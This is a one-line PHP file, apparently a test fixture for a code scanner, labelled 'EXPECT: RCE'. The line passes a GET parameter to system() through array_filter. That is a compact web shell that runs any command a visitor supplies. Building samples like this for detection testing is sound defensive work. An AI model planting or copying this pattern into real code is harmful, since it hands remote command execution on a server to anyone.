<?php
// EXPECT: RCE
array_filter([$_GET['c']], 'system');
